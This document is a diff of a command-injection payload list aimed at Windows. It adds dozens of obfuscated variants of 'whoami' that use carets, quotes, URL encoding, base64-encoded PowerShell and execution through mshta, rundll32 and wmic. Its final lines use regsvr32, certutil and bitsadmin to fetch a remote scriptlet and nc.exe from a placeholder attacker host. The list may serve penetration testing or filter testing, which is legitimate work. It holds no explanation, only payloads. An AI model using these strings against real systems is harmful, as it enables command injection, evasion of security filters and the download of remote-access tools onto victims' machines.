@@ -1,7 +1,56 @@
-wh"o"ami
+w^hoami
+wh^oami
 who^ami
-who$ami
-w\ho\am\i
-cmd /c "who"+"ami"
-cmd /c echo whoami|cmd
-set cmd=who& set cmd2=ami & %cmd%%cmd2%
+whoa^mi
+w"h"o"a"m"i
+wh""oami
+who""ami
+(whoami)
+((whoami))
+(((whoami)))
+& w^hoami
+& wh^oami
+& who^ami
+& wh""oami
+& who""ami
+& (whoami)
+cmd /c "whoami"
+cmd /c 'whoami'
+cmd /c w^hoami
+cmd /c "w"h"o"a"m"i"
+cmd.exe /c whoami
+%COMSPEC% /c whoami
+%SYSTEMROOT%\System32\cmd.exe /c whoami
+%WINDIR%\System32\cmd.exe /c whoami
+%SystemRoot%\SysWOW64\cmd.exe /c whoami
+%TEMP%\..\System32\cmd.exe /c whoami
+C:\Windows\System32\cmd.exe /c whoami
+C:\WINDOWS\SYSTEM32\CMD.EXE /c whoami
+c:/windows/system32/cmd.exe /c whoami
+C:\Windo\ws\System32\cmd.exe /c whoami
+C:\Win^dows\System32\cmd.exe /c whoami
+C:\Windows%00\System32\cmd.exe /c whoami
+whoami%00
+whoami%20
+%77hoami
+%77%68%6f%61%6d%69
+%5cwhoami
+^w^h^o^a^m^i
+"whoami"
+'whoami'
+`whoami`
+$(whoami)
+(w)(h)(o)(a)(m)(i)
+set a=who&&set b=ami&&call %a%%b%
+for /f %i in ('whoami') do echo %i
+powershell -c "whoami"
+powershell -enc dwBoAG8AYQBtAGkA
+powershell -win hidden -c "whoami"
+powershell -exec bypass -c "whoami"
+mshta vbscript:execute("createobject(""wscript.shell"").exec(""whoami"")(0)")
+mshta javascript:eval("new ActiveXObject('WScript.Shell').Run('cmd /c whoami',0,true)")
+rundll32 shell32.dll,ShellExec_RunDLL cmd.exe /c whoami
+wmic process call create "cmd.exe /c whoami"
+regsvr32 /s /n /u /i:http://ATTACKER_IP/test.sct scrobj.dll
+certutil -urlcache -split -f http://ATTACKER_IP/nc.exe C:\nc.exe
+bitsadmin /transfer x http://ATTACKER_IP/nc.exe C:\nc.exe
